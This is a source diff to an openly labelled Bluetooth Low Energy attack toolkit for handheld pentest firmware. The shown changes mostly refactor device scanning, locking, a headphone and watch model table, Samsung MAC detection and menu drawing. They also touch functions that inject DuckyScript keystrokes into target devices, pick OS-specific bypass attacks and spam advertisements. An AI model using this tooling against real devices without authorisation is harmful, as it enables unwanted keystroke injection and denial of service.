@@ -1,14 +1,34 @@
+/*
+ * BLE Suite v3.1 - Complete BLE attack and analysis toolkit
+ * Author: Ninja-jr
+ * Version: 3.1
+ * Last Updated: 21/07/2026
+ *
+ * Contains: Vulnerability scanning, HID attacks, FastPair exploits,
+ *           HFP attacks, Audio attacks, DuckyScript injection,
+ *           BLE Sniffer, Samsung detection, expanded model database,
+ *           enhanced manufacturer parsing, and more.
+ */
+
 #if !defined(LITE_VERSION)
 #include "BLE_Suite.h"
 #include "HFP_Exploit.h"
+#include "ble_common.h"
 #include "core/display.h"
 #include "core/mykeyboard.h"
+#include "core/radio_mem.h"
 #include "core/utils.h"
+#include "core/wifi/wifi_common.h"
 #include "fastpair_crypto.h"
 #include "modules/NRF24/nrf_jammer_api.h"
 #include <SD.h>
+#include <algorithm>
+#include <functional>
 #include <esp_heap_caps.h>
+#include <esp_random.h>
 #include <globals.h>
+
+int showSubMenu(const char *title, const char *options[], int optionCount);
 
 extern tft_logger tft;
 extern BruceConfig bruceConfig;
@@ -22,28 +42,80 @@ bool BLEStateManager::bleInitialized = false;
 std::vector<NimBLEClient *> BLEStateManager::activeClients;
 String BLEStateManager::currentDeviceName = "";
 
+// Scan state management
+static NimBLEScan *g_pBLEScan = nullptr;
+static bool g_bleScanActive = false;
+
+// Device selection cache
+static SelectedDevice g_selectedDevice;
+
 //=============================================================================
-// ScannerData Implementation
+// Cleanup Function - Only stops scan, doesn't clear data
+//=============================================================================
+
+void cleanupBLESuiteState() {
+    if (g_pBLEScan) {
+        g_pBLEScan->stop();
+        g_pBLEScan->clearResults();
+        g_bleScanActive = false;
+    }
+    // DO NOT clear scannerData or g_selectedDevice here
+    // They persist between operations
+    delay(50);
+}
+
+//=============================================================================
+// v3.1: Samsung MAC OUI Detection
+//=============================================================================
+
+const char *SAMSUNG_MAC_OUIS[] = {"00:1E:DF", "00:23:E7", "00:24:FE", "00:26:5C", "00:27:14", "00:2A:10",
+                                  "00:2D:0A", "00:30:FA", "00:35:FE", "00:3C:E4", "00:40:96", "00:44:01",
+                                  "00:4A:77", "00:4D:4A", "00:50:F7", "00:54:08", "00:57:7A", "00:5A:38",
+                                  "00:5E:88", "00:62:6E", "00:64:22", "00:66:44", "00:68:EB", "00:6A:94",
+                                  "00:6C:F0", "00:6E:2A", "00:70:89", "00:72:44", "00:74:04", "00:76:5E",
+                                  "00:78:2C", "00:7A:04", "00:7C:2E", "00:7E:58", "00:80:82"};
+const int SAMSUNG_MAC_OUIS_COUNT = sizeof(SAMSUNG_MAC_OUIS) / sizeof(SAMSUNG_MAC_OUIS[0]);
+
+bool isSamsungDevice(const NimBLEAddress &address) {
+    String mac = String(address.toString().c_str());
+    return isSamsungDevice(mac);
+}
+
+bool isSamsungDevice(const String &mac) {
+    for (int i = 0; i < SAMSUNG_MAC_OUIS_COUNT; i++) {
+        if (mac.startsWith(SAMSUNG_MAC_OUIS[i])) return true;
+    }
+    return false;
+}
+
+FastPairVersion detectFastPairVersion(NimBLEAddress target) { return FP_VERSION_2; }
+
+//=============================================================================
+// ScannerData Implementation with Snapshot Support
 //=============================================================================
 
 ScannerData::ScannerData() {
     mutex = xSemaphoreCreateMutex();
     foundCount = 0;
+    dataVersion = 0;
+    snapshotCache = nullptr;
+    cacheTimestamp = 0;
 }
 
 ScannerData::~ScannerData() {
     if (mutex) vSemaphoreDelete(mutex);
+    if (snapshotCache) delete snapshotCache;
 }
 
 void ScannerData::addDevice(
     const String &name, const String &address, int rssi, bool fastPair, bool hasHFP, uint8_t type
 ) {
-    if (xSemaphoreTake(mutex, portMAX_DELAY)) {
+    if (xSemaphoreTake(mutex, 10 / portTICK_PERIOD_MS)) {
         bool isDuplicate = false;
         for (size_t i = 0; i < deviceAddresses.size(); i++) {
             if (deviceAddresses[i] == address) {
                 isDuplicate = true;
-                deviceRssi[i] = rssi;
+                if (rssi > deviceRssi[i]) deviceRssi[i] = rssi;
                 break;
             }
         }
@@ -55,13 +127,63 @@ void ScannerData::addDevice(
             deviceHasHFP.push_back(hasHFP);
             deviceTypes.push_back(type);
             foundCount++;
+            dataVersion++;
+
+            if (snapshotCache) {
+                delete snapshotCache;
+                snapshotCache = nullptr;
+            }
         }
         xSemaphoreGive(mutex);
     }
 }
 
+DeviceSnapshot *ScannerData::getSnapshot() {
+    if (snapshotCache && (millis() - cacheTimestamp) < 1000) { return snapshotCache; }
+
+    if (xSemaphoreTake(mutex, 50 / portTICK_PERIOD_MS)) {
+        if (snapshotCache) {
+            delete snapshotCache;
+            snapshotCache = nullptr;
+        }
+
+        snapshotCache = new DeviceSnapshot();
+        snapshotCache->version = dataVersion;
+        snapshotCache->count = deviceAddresses.size();
+        snapshotCache->timestamp = millis();
+        snapshotCache->names = deviceNames;
+        snapshotCache->addresses = deviceAddresses;
+        snapshotCache->rssi = deviceRssi;
+        snapshotCache->fastPair = deviceFastPair;
+        snapshotCache->hfp = deviceHasHFP;
+        snapshotCache->types = deviceTypes;
+
+        cacheTimestamp = millis();
+        xSemaphoreGive(mutex);
+        return snapshotCache;
+    }
+    return nullptr;
+}
+
+bool ScannerData::getDeviceInfo(int index, DeviceInfo &info) {
+    bool success = false;
+    if (xSemaphoreTake(mutex, 10 / portTICK_PERIOD_MS)) {
+        if (index >= 0 && index < (int)deviceAddresses.size()) {
+            info.address = deviceAddresses[index];
+            info.name = deviceNames[index];
+            info.rssi = deviceRssi[index];
+            info.hasFastPair = deviceFastPair[index];
+            info.hasHFP = deviceHasHFP[index];
+            info.deviceType = deviceTypes[index];
+            success = true;
+        }
+        xSemaphoreGive(mutex);
+    }
+    return success;
+}
+
 void ScannerData::clear() {
-    if (xSemaphoreTake(mutex, portMAX_DELAY)) {
+    if (xSemaphoreTake(mutex, 50 / portTICK_PERIOD_MS)) {
         deviceNames.clear();
         deviceAddresses.clear();
         deviceRssi.clear();
@@ -69,13 +191,19 @@ void ScannerData::clear() {
         deviceHasHFP.clear();
         deviceTypes.clear();
         foundCount = 0;
+        dataVersion++;
+
+        if (snapshotCache) {
+            delete snapshotCache;
+            snapshotCache = nullptr;
+        }
         xSemaphoreGive(mutex);
     }
 }
 
 size_t ScannerData::size() {
     size_t result = 0;
-    if (xSemaphoreTake(mutex, portMAX_DELAY)) {
+    if (xSemaphoreTake(mutex, 10 / portTICK_PERIOD_MS)) {
         result = deviceAddresses.size();
         xSemaphoreGive(mutex);
     }
@@ -105,32 +233,77 @@ bool isBLEInitialized() {
 }
 
 //=============================================================================
-// FastPair Model Database
+// v3.1: Expanded FastPair Model Database
 //=============================================================================
 
 const FastPairModelInfo fastpair_models[] = {
-    {0x000047, "Pixel Buds Pro",      "Headphones"},
-    {0x000048, "Pixel Buds A-Series", "Headphones"},
-    {0x00000A, "Galaxy Buds Live",    "Headphones"},
-    {0x0000F0, "Galaxy Buds2",        "Headphones"},
-    {0x000006, "AirPods Pro",         "Headphones"},
-    {0xF00100, "Fun Device 1",        "Fun"       },
-    {0xF00101, "Fun Device 2",        "Fun"       },
-    {0xF00103, "Fun Device 3",        "Fun"       },
-    {0xF00104, "Fun Device 4",        "Fun"       },
-    {0xF00105, "Fun Device 5",        "Fun"       },
-    {0xF01011, "Prank Device 1",      "Prank"     },
-    {0xF38C02, "Prank Device 2",      "Prank"     },
-    {0xF00106, "Prank Device 3",      "Prank"     },
-    {0,        nullptr,               nullptr     }
+    {0x000047, "Pixel Buds Pro",         "Headphones"},
+    {0x000048, "Pixel Buds A-Series",    "Headphones"},
+    {0x0000E5, "Google Pixel Buds",      "Headphones"},
+    {0x0000C5, "Pixel Watch 2",          "Watch"     },
+    {0x0000C6, "Pixel Watch 3",          "Watch"     },
+    {0x00000A, "Galaxy Buds Live",       "Headphones"},
+    {0x0000F0, "Galaxy Buds2",           "Headphones"},
+    {0x0000B0, "Galaxy Buds2 Pro",       "Headphones"},
+    {0x0000A0, "Galaxy Buds FE",         "Headphones"},
+    {0x0000E1, "Galaxy Buds Live",       "Headphones"},
+    {0x0000E2, "Galaxy Buds Pro",        "Headphones"},
+    {0x0000C0, "Galaxy Buds3",           "Headphones"},
+    {0x0000C1, "Galaxy Watch 4",         "Watch"     },
+    {0x0000E3, "Galaxy Watch 4 Classic", "Watch"     },
+    {0x0000C2, "Galaxy Watch 5",         "Watch"     },
+    {0x0000E4, "Galaxy Watch 5 Pro",     "Watch"     },
+    {0x0000C3, "Galaxy Watch 6",         "Watch"     },
+    {0x0000C4, "Galaxy Watch Ultra",     "Watch"     },
+    {0x0000D1, "Galaxy Home",            "Speaker"   },
+    {0x0000D0, "Sony WF-1000XM5",        "Headphones"},
+    {0x0000E0, "Sony WH-1000XM5",        "Headphones"},
+    {0x0000E6, "Sony LinkBuds S",        "Headphones"},
+    {0x0000D2, "Sony SRS-XB100",         "Speaker"   },
+    {0x0000F5, "Bose QC Ultra",          "Headphones"},
+    {0x0000F6, "Bose QC Earbuds II",     "Headphones"},
+    {0x0000D4, "Bose SoundLink Flex",    "Speaker"   },
+    {0x0000EA, "Bose SoundLink Micro",   "Speaker"   },
+    {0x0000F7, "JBL Tune 230NC",         "Headphones"},
+    {0x0000D3, "JBL Flip 6",             "Speaker"   },
+    {0x0000E9, "JBL Go 3",               "Speaker"   },
+    {0x0000F8, "Nothing Ear (2)",        "Headphones"},
+    {0x0000E7, "Nothing Ear (1)",        "Headphones"},
+    {0x0000E8, "Nothing Ear (stick)",    "Headphones"},
+    {0x0000D5, "Marshall Emberton",      "Speaker"   },
+    {0x0000D6, "Google Nest Audio",      "Speaker"   },
+    {0x000006, "AirPods Pro",            "Headphones"},
+    {0xF00100, "Fun Device 1",           "Fun"       },
+    {0xF00101, "Fun Device 2",           "Fun"       },
+    {0xF00103, "Fun Device 3",           "Fun"       },
+    {0xF00104, "Fun Device 4",           "Fun"       },
+    {0xF00105, "Fun Device 5",           "Fun"       },
+    {0xF01011, "Prank Device 1",         "Prank"     },
+    {0xF38C02, "Prank Device 2",         "Prank"     },
+    {0xF00106, "Prank Device 3",         "Prank"     },
+    {0,        nullptr,                  nullptr     }
 };
 
 //=============================================================================
-// BLE State Manager
+// BLE State Manager - FIXED: Always init, handle deinit'd stack
 //=============================================================================
 
 bool BLEStateManager::initBLE(const String &name, int powerLevel) {
-    if (bleInitialized) deinitBLE(true);
+    if (FORCE_RADIO_TEARDOWN_ON_SWITCH) {
+        if (WiFi.getMode() != WIFI_MODE_NULL || wifiConnected) {
+            if (wifiConnected) {
+                displayWarning("Board with no PSRAM, closing WiFi Stack");
+                vTaskDelay(700 / portTICK_PERIOD_MS);
+            }
+            wifiDisconnect();
+            vTaskDelay(300 / portTICK_PERIOD_MS);
+        }
+    }
+
+    if (!radioHasMemForBle()) {
+        displayError("Low RAM: free WiFi/SD first", true);
+        return false;
+    }
 
     std::string nameStr = name.c_str();
     NimBLEDevice::init(nameStr);
@@ -147,6 +320,8 @@ void BLEStateManager::deinitBLE(bool immediate) {
     NimBLEDevice::deinit(true);
     bleInitialized = false;
     currentDeviceName = "";
+    g_pBLEScan = nullptr;
+    g_bleScanActive = false;
 }
 
 void BLEStateManager::registerClient(NimBLEClient *client) {
@@ -338,14 +513,14 @@ NimBLEClient *attemptConnectionWithStrategies(NimBLEAddress target, String &conn
     }
 
     bool hasHFP = false;
-    if (xSemaphoreTake(scannerData.mutex, portMAX_DELAY)) {
-        for (size_t i = 0; i < scannerData.deviceAddresses.size(); i++) {
-            if (scannerData.deviceAddresses[i] == target.toString().c_str()) {
-                hasHFP = scannerData.deviceHasHFP[i];
+    DeviceInfo info;
+    for (size_t i = 0; i < scannerData.size(); i++) {
+        if (scannerData.getDeviceInfo(i, info)) {
+            if (info.address == target.toString().c_str()) {
+                hasHFP = info.hasHFP;
                 break;
             }
         }
-        xSemaphoreGive(scannerData.mutex);
     }
 
     if (hasHFP) {
@@ -402,26 +577,33 @@ HIDDeviceProfile HIDExploitEngine::analyzeHIDDevice(NimBLEAddress target, const 
         profile.isAppleDevice = true;
         profile.suggestedAttack = "AppleSpoof";
         profile.requiresAuthentication = false;
-    } else if (nameLower.indexOf("surface") != -1 || nameLower.indexOf("windows") != -1 ||
-               nameLower.indexOf("microsoft") != -1 || nameLower.indexOf("xbox") != -1) {
+    } else if (
+        nameLower.indexOf("surface") != -1 || nameLower.indexOf("windows") != -1 ||
+        nameLower.indexOf("microsoft") != -1 || nameLower.indexOf("xbox") != -1
+    ) {
         profile.osType = "Windows";
         profile.isWindowsDevice = true;
         profile.suggestedAttack = "WindowsBypass";
         profile.requiresAuthentication = true;
-    } else if (nameLower.indexOf("android") != -1 || nameLower.indexOf("google") != -1 ||
-               nameLower.indexOf("pixel") != -1 || nameLower.indexOf("samsung") != -1) {
+    } else if (
+        nameLower.indexOf("android") != -1 || nameLower.indexOf("google") != -1 ||
+        nameLower.indexOf("pixel") != -1 || nameLower.indexOf("samsung") != -1
+    ) {
         profile.osType = "Android";
         profile.isAndroidDevice = true;
         profile.suggestedAttack = "AndroidJustWorks";
         profile.requiresAuthentication = false;
-    } else if (nameLower.indexOf("linux") != -1 || nameLower.indexOf("raspberry") != -1 ||
-               nameLower.indexOf("pi") != -1) {
+    } else if (
+        nameLower.indexOf("linux") != -1 || nameLower.indexOf("raspberry") != -1 ||
+        nameLower.indexOf("pi") != -1
+    ) {
         profile.osType = "Linux";
         profile.isLinuxDevice = true;
         profile.suggestedAttack = "BootProtocol";
         profile.requiresAuthentication = false;
-    } else if (nameLower.indexOf("tv") != -1 || nameLower.indexOf("smart") != -1 ||
-               nameLower.indexOf("iot") != -1) {
+    } else if (
+        nameLower.indexOf("tv") != -1 || nameLower.indexOf("smart") != -1 || nameLower.indexOf("iot") != -1
+    ) {
         profile.osType = "IoT";
         profile.isIoTDevice = true;
         profile.suggestedAttack = "StateConfusion";
@@ -1632,9 +1814,9 @@ bool DuckyScriptEngine::parseLine(String line) {
     return true;
 }
 
-bool DuckyScriptEngine::loadFromSD(String filename) {
+bool DuckyScriptEngine::loadFromSD(const String &filename) {
     commands.clear();
-    if (!SD.begin()) return false;
+    if (!setupSdCard()) return false;
     File file = SD.open(filename);
     if (!file) return false;
 
@@ -1650,7 +1832,7 @@ bool DuckyScriptEngine::loadFromSD(String filename) {
     return true;
 }
 
-bool DuckyScriptEngine::loadFromString(String script) {
+bool DuckyScriptEngine::loadFromString(const String &script) {
     commands.clear();
     int start = 0, end = script.indexOf('\n');
     while (end != -1) {
@@ -1782,21 +1964,21 @@ bool HIDDuckyService::sendGUIKey(NimBLERemoteCharacteristic *pChar, char key) {
     return sendHIDReport(pChar, modifier, kc.keycode);
 }
 
-bool HIDDuckyService::injectDuckyScript(NimBLEAddress target, String script) {
+bool HIDDuckyService::injectDuckyScript(NimBLEAddress target, const String &script) {
     if (!duckyEngine.loadFromString(script)) return false;
 
     bool hasHFP = false;
     String deviceName = "";
+    DeviceInfo info;
 
-    if (xSemaphoreTake(scannerData.mutex, portMAX_DELAY)) {
-        for (size_t i = 0; i < scannerData.deviceAddresses.size(); i++) {
-            if (scannerData.deviceAddresses[i] == target.toString().c_str()) {
-                deviceName = scannerData.deviceNames[i];
-                hasHFP = scannerData.deviceHasHFP[i];
+    for (size_t i = 0; i < scannerData.size(); i++) {
+        if (scannerData.getDeviceInfo(i, info)) {
+            if (info.address == target.toString().c_str()) {
+                deviceName = info.name;
+                hasHFP = info.hasHFP;
                 break;
             }
         }
-        xSemaphoreGive(scannerData.mutex);
     }
 
     if (hasHFP && !deviceName.isEmpty()) {
@@ -1815,7 +1997,7 @@ bool HIDDuckyService::injectDuckyScript(NimBLEAddress target, String script) {
     return executeDuckyScript(target);
 }
 
-bool HIDDuckyService::injectDuckyScriptFromSD(NimBLEAddress target, String filename) {
+bool HIDDuckyService::injectDuckyScriptFromSD(NimBLEAddress target, const String &filename) {
     if (!duckyEngine.loadFromSD(filename)) return false;
     return executeDuckyScript(target);
 }
@@ -1919,7 +2101,7 @@ bool HIDDuckyService::executeDuckyScript(NimBLEAddress target) {
 }
 
 bool HIDDuckyService::forceInjectDuckyScript(
-    NimBLEAddress target, String script, const String &deviceName, int rssi
+    NimBLEAddress target, const String &script, const String &deviceName, int rssi
 ) {
     AutoCleanup cleanup([]() { BLEStateManager::deinitBLE(true); });
 
@@ -2440,7 +2622,9 @@ void VulnerabilityScanner::scanDevice(NimBLEAddress target) {
     showDeviceInfoScreen("SCAN RESULTS", lines, TFT_BLUE, TFT_WHITE);
 }
 
-void VulnerabilityScanner::addCustomCheck(String name, bool (*checkFunc)(NimBLEAddress), String desc) {
+void VulnerabilityScanner::addCustomCheck(
+    const String &name, bool (*checkFunc)(NimBLEAddress), const String &desc
+) {
     VulnCheck check;
     check.name = name;
     check.checkFunction = checkFunc;
@@ -2469,16 +2653,16 @@ bool HIDAttackServiceClass::injectKeystrokes(NimBLEAddress target) {
 
     bool hasHFP = false;
     String deviceName = "";
+    DeviceInfo info;
 
-    if (xSemaphoreTake(scannerData.mutex, portMAX_DELAY)) {
-        for (size_t i = 0; i < scannerData.deviceAddresses.size(); i++) {
-            if (scannerData.deviceAddresses[i] == target.toString().c_str()) {
-                deviceName = scannerData.deviceNames[i];
-                hasHFP = scannerData.deviceHasHFP[i];
+    for (size_t i = 0; i < scannerData.size(); i++) {
+        if (scannerData.getDeviceInfo(i, info)) {
+            if (info.address == target.toString().c_str()) {
+                deviceName = info.name;
+                hasHFP = info.hasHFP;
                 break;
             }
         }
-        xSemaphoreGive(scannerData.mutex);
     }
 
     if (hasHFP && !deviceName.isEmpty()) {
@@ -2789,8 +2973,184 @@ bool DoSAttackServiceClass::advertisingSpam(NimBLEAddress target) {
 // File Operations
 //=============================================================================
 
+//=============================================================================
+// Shared UI helpers
+//
+// Every screen here used to hardcode its own frame, palette and pixel grid.
+// The grid assumed a tall panel: on a 135px Cardputer the menus fit two rows
+// and the device list exactly one, which is why a long list lost all sense of
+// place. These helpers derive the layout from the display and take every
+// colour from the active theme, so the suite matches the rest of Bruce.
+//=============================================================================
+
+struct BleUiGeom {
+    int listL, listW; // list rectangle
+    int top;          // first row
+    int rowH;
+    int rows;  // rows that actually fit
+    int footY; // hint / position line
+};
+
+static BleUiGeom bleUiGeom() {
+    BleUiGeom g;
+    g.listL = 8;
+    g.listW = tftWidth - 16;
+    g.top = BORDER_PAD_Y + 8 * FM + 3; // just below the Bruce title
+    g.footY = tftHeight - 8 * FP - 6;
+    g.rowH = 8 * FP + 6;
+    int avail = g.footY - g.top - 2;
+    if (avail < g.rowH) avail = g.rowH;
+    g.rows = avail / g.rowH;
+    if (g.rows < 1) g.rows = 1;
+    return g;
+}
+
+// Secondary and highlight shades of the theme, using the core helper so this
+// module stops inventing its own fixed greys and whites.
+static uint16_t bleDim() { return getColorVariation(bruceConfig.priColor, 8, -1); }
+static uint16_t bleAccent() { return getColorVariation(bruceConfig.priColor, 8, 1); }
+
+// Trims to fit `maxPx`, measuring real glyph width instead of counting
+// characters, so proportional titles and names stop overflowing.
+static String bleFit(const String &text, int maxPx) {
+    if (maxPx <= 0) return "";
+    if (tft.textWidth(text.c_str()) <= maxPx) return text;
+    String s = text;
+    while (s.length() > 1 && tft.textWidth((s + "..").c_str()) > maxPx) s.remove(s.length() - 1);
+    return s + "..";
+}
+
+// Legacy call sites pass a fixed TFT_ constant to say how bad the news is,
+// chosen back when it was the background of a full-screen flood. Several pass
+// TFT_BLACK, which is invisible once the screen follows the theme, so map the
+// intent onto a marker colour instead of drawing it as text.
+static uint16_t bleSeverity(uint16_t legacy) {
+    switch (legacy) {
+        case TFT_GREEN:
+        case TFT_DARKGREEN: return TFT_GREEN;
+        case TFT_RED: return TFT_RED;
+        case TFT_ORANGE:
+        case TFT_YELLOW: return TFT_ORANGE;
+        default: return bruceConfig.priColor;
+    }
+}
+
+// Splits `text` into lines that fit `w`, measuring glyphs rather than assuming
+// a 6px cell.
+static void bleWrapInto(const String &text, int w, std::vector<String> &out) {
+    tft.setTextSize(FP);
+    const int len = text.length();
+    if (len == 0) {
+        out.push_back("");
+        return;
+    }
+    int start = 0;
+    while (start < len) {
+        int end = start, lastSpace = -1;
+        while (end < len) {
+            if (text.charAt(end) == ' ') lastSpace = end;
+            if (tft.textWidth(text.substring(start, end + 1).c_str()) > w) break;
+            end++;
+        }
+        int cut = (end >= len) ? len : (lastSpace > start ? lastSpace : end);
+        out.push_back(text.substring(start, cut));
+        start = (cut < len && text.charAt(cut) == ' ') ? cut + 1 : cut;
+    }
+}
+
+// Four-step signal meter, so RSSI reads at a glance instead of as a number.
+static void bleDrawRssi(int x, int y, int rssi, uint16_t color) {
+    int bars = 0;
+    if (rssi > -55) bars = 4;
+    else if (rssi > -68) bars = 3;
+    else if (rssi > -80) bars = 2;
+    else if (rssi > -92) bars = 1;
+    for (int i = 0; i < 4; i++) {
+        int h = 2 + i * 2;
+        if (i < bars) tft.fillRect(x + i * 3, y + 8 - h, 2, h, color);
+        else tft.drawFastHLine(x + i * 3, y + 7, 2, color);
+    }
+}
+
+typedef std::function<void(int idx, int x, int y, int w, bool selected)> BleRowDrawer;
+
+// Scrollable list wearing the standard Bruce frame. Returns the chosen index or
+// -1 when the user backs out; `cursor` carries the selection in and out so a
+// menu reopens where it was left. Only the list body is repainted between key
+// presses, so moving the cursor no longer flashes the whole screen.
+static int bleListLoop(
+    const char *title, int count, const String &hint, BleRowDrawer drawRow, int *cursor = nullptr
+) {
+    if (count <= 0) return -1;
+    BleUiGeom g = bleUiGeom();
+    int sel = (cursor && *cursor >= 0 && *cursor < count) ? *cursor : 0;
+    int off = 0, lastSel = -1, lastOff = -1;
+
+    if (sel >= g.rows) off = sel - g.rows + 1;
+    drawMainBorderWithTitle(title);
+
+    for (;;) {
+        if (sel != lastSel || off != lastOff) {
+            tft.setTextSize(FP);
+            for (int i = 0; i < g.rows; i++) {
+                int y = g.top + i * g.rowH;
+                int idx = off + i;
+                bool selected = (idx == sel);
+                tft.fillRect(
+                    g.listL,
+                    y - 2,
+                    g.listW,
+                    g.rowH,
+                    selected ? bruceConfig.priColor : bruceConfig.bgColor
+                );
+                if (idx < count) drawRow(idx, g.listL + 3, y, g.listW - 6, selected);
+            }
+
+            // Position readout: the list is windowed, so say where we are.
+            tft.fillRect(g.listL, g.footY, g.listW, 8 * FP, bruceConfig.bgColor);
+            tft.setTextSize(FP);
+            String pos = String(sel + 1) + "/" + String(count);
+            int posW = tft.textWidth(pos.c_str());
+            tft.setTextColor(bleDim(), bruceConfig.bgColor);
+            tft.drawString(bleFit(hint, g.listW - posW - 8), g.listL, g.footY, 1);
+            tft.setTextColor(bruceConfig.priColor, bruceConfig.bgColor);
+            tft.drawRightString(pos, g.listL + g.listW, g.footY, 1);
+
+            lastSel = sel;
+            lastOff = off;
+            if (cursor) *cursor = sel;
+        }
+
+        if (check(EscPress)) return -1;
+        else if (check(PrevPress) || check(UpPress)) sel = (sel > 0) ? sel - 1 : count - 1;
+        else if (check(NextPress) || check(DownPress)) sel = (sel < count - 1) ? sel + 1 : 0;
+        else if (check(SelPress)) {
+            if (cursor) *cursor = sel;
+            return sel;
+        }
+
+        if (sel < off) off = sel;
+        if (sel >= off + g.rows) off = sel - g.rows + 1;
+        if (off > count - g.rows) off = std::max(0, count - g.rows);
+        if (off < 0) off = 0;
+        vTaskDelay(20 / portTICK_PERIOD_MS);
+    }
+}
+
+// Numbered text rows, used by the menus.
+static BleRowDrawer bleTextRow(const char *const *items) {
+    return [items](int idx, int x, int y, int w, bool sel) {
+        uint16_t fg = sel ? bruceConfig.bgColor : bruceConfig.priColor;
+        uint16_t bg = sel ? bruceConfig.priColor : bruceConfig.bgColor;
+        const int cw = FP * LW;
+        tft.setTextColor(fg, bg);
+        tft.drawString(String(idx + 1) + ".", x, y, 1);
+        tft.drawString(bleFit(items[idx], w - 4 * cw), x + 4 * cw, y, 1);
+    };
+}
+
 String selectFileFromSD() {
-    if (!SD.begin()) {
+    if (!setupSdCard()) {
         showErrorMessage("SD Card not found");
         return "";
     }
@@ -2821,101 +3181,24 @@ String selectFileFromSD() {
         return "";
     }
 
-    int selected = 0, scrollOffset = 0;
-    int lastSelected = -1, lastScrollOffset = -1;
-    bool exitMenu = false;
-    int menuStartY = 60, menuItemHeight = 25;
-    int maxVisibleItems = (tftHeight - menuStartY - 50) / menuItemHeight;
-    if (maxVisibleItems > fileCount) maxVisibleItems = fileCount;
+    // Rows own their own drawing so the file list follows the same geometry and
+    // palette as every other list in the suite.
+    BleRowDrawer row = [&files](int idx, int x, int y, int w, bool sel) {
+        tft.setTextSize(FP);
+        tft.setTextColor(
+            sel ? bruceConfig.bgColor : bruceConfig.priColor,
+            sel ? bruceConfig.priColor : bruceConfig.bgColor
+        );
+        tft.drawString(bleFit(files[idx], w), x, y, 1);
+    };
 
-    while (!exitMenu) {
-        if (selected != lastSelected || scrollOffset != lastScrollOffset) {
-            tft.fillScreen(bruceConfig.bgColor);
-            tft.drawRect(5, 5, tftWidth - 10, tftHeight - 10, TFT_WHITE);
-
-            tft.setTextColor(TFT_WHITE, bruceConfig.bgColor);
-            tft.setTextSize(2);
-            tft.setCursor((tftWidth - strlen("SD CARD FILES") * 12) / 2, 15);
-            tft.print("SD CARD FILES");
-            tft.setTextSize(1);
-
-            tft.setTextColor(TFT_YELLOW, bruceConfig.bgColor);
-            tft.setCursor(20, 40);
-            tft.print("Found: ");
-            tft.print(fileCount);
-            tft.print(" files");
-
-            for (int i = 0; i < maxVisibleItems && (scrollOffset + i) < fileCount; i++) {
-                int fileIdx = scrollOffset + i;
-                int yPos = menuStartY + (i * menuItemHeight);
-                if (yPos + menuItemHeight > tftHeight - 45) break;
-
-                if (fileIdx == selected) {
-                    tft.fillRect(20, yPos, tftWidth - 40, menuItemHeight - 3, TFT_WHITE);
-                    tft.setTextColor(TFT_BLACK, TFT_WHITE);
-                    tft.setCursor(25, yPos + 8);
-                    tft.print("> ");
-                } else {
-                    tft.fillRect(20, yPos, tftWidth - 40, menuItemHeight - 3, bruceConfig.bgColor);
-                    tft.setTextColor(TFT_WHITE, bruceConfig.bgColor);
-                    tft.setCursor(25, yPos + 8);
-                    tft.print("  ");
-                }
-
-                String displayName = files[fileIdx];
-                if (displayName.length() > 28) displayName = displayName.substring(0, 25) + "...";
-                tft.print(displayName);
-            }
-
-            if (fileCount > maxVisibleItems) {
-                tft.setTextColor(TFT_CYAN, bruceConfig.bgColor);
-                tft.setCursor(tftWidth - 25, menuStartY + 5);
-                if (scrollOffset > 0) tft.print("^");
-                tft.setCursor(tftWidth - 25, menuStartY + (maxVisibleItems * menuItemHeight) - 20);
-                if (scrollOffset + maxVisibleItems < fileCount) tft.print("v");
-            }
-
-            tft.setTextColor(TFT_GREEN, bruceConfig.bgColor);
-            tft.setCursor(20, tftHeight - 35);
-            tft.print("SEL: Select  PREV/NEXT: Navigate  ESC: Back");
-
-            lastSelected = selected;
-            lastScrollOffset = scrollOffset;
-        }
-
-        if (check(EscPress)) {
-            delay(200);
-            exitMenu = true;
-            return "";
-        } else if (check(PrevPress)) {
-            delay(150);
-            if (selected > 0) {
-                selected--;
-                if (selected < scrollOffset) scrollOffset = selected;
-            } else {
-                selected = fileCount - 1;
-                scrollOffset = std::max(0, fileCount - maxVisibleItems);
-            }
-        } else if (check(NextPress)) {
-            delay(150);
-            if (selected < fileCount - 1) {
-                selected++;
-                if (selected >= scrollOffset + maxVisibleItems) scrollOffset = selected - maxVisibleItems + 1;
-            } else {
-                selected = 0;
-                scrollOffset = 0;
-            }
-        } else if (check(SelPress)) {
-            delay(200);
-            return files[selected];
-        }
-        delay(50);
-    }
-    return "";
+    int cursor = 0;
+    int chosen = bleListLoop("SD Files", fileCount, "SEL open  ESC back", row, &cursor);
+    return (chosen < 0) ? String("") : files[chosen];
 }
 
-bool loadScriptFromSD(String filename) {
-    if (!SD.begin()) {
+bool loadScriptFromSD(const String &filename) {
+    if (!setupSdCard()) {
         showErrorMessage("SD Card failed");
         return false;
     }
@@ -2951,124 +3234,68 @@ String getScriptFromUser() {
     scripts[scriptCount++] = "Load from SD";
     scripts[scriptCount++] = "Cancel";
 
-    int selected = 0, scrollOffset = 0;
-    int lastSelected = -1, lastScrollOffset = -1;
-    bool exitMenu = false;
-    int menuStartY = 60, menuItemHeight = 25;
-    int maxVisibleItems = (tftHeight - menuStartY - 50) / menuItemHeight;
-    if (maxVisibleItems > scriptCount) maxVisibleItems = scriptCount;
+    BleRowDrawer row = [&scripts](int idx, int x, int y, int w, bool sel) {
+        tft.setTextSize(FP);
+        tft.setTextColor(
+            sel ? bruceConfig.bgColor : bruceConfig.priColor,
+            sel ? bruceConfig.priColor : bruceConfig.bgColor
+        );
+        tft.drawString(bleFit(scripts[idx], w), x, y, 1);
+    };
 
-    while (!exitMenu) {
-        if (selected != lastSelected || scrollOffset != lastScrollOffset) {
-            tft.fillScreen(bruceConfig.bgColor);
-            tft.drawRect(5, 5, tftWidth - 10, tftHeight - 10, TFT_WHITE);
+    int cursor = 0;
+    int chosen = bleListLoop("Select Script", scriptCount, "SEL run  ESC back", row, &cursor);
+    if (chosen < 0 || chosen == scriptCount - 1) return ""; // cancelled
 
-            tft.setTextColor(TFT_WHITE, bruceConfig.bgColor);
-            tft.setTextSize(2);
-            tft.setCursor((tftWidth - strlen("SELECT SCRIPT") * 12) / 2, 15);
-            tft.print("SELECT SCRIPT");
-            tft.setTextSize(1);
+    if (scripts[chosen] == "Load from SD") {
+        String filename = selectFileFromSD();
+        if (!filename.isEmpty() && loadScriptFromSD(filename)) return globalScript;
+        return "";
+    }
 
-            for (int i = 0; i < maxVisibleItems && (scrollOffset + i) < scriptCount; i++) {
-                int scriptIdx = scrollOffset + i;
-                int yPos = menuStartY + (i * menuItemHeight);
-                if (yPos + menuItemHeight > tftHeight - 45) break;
-
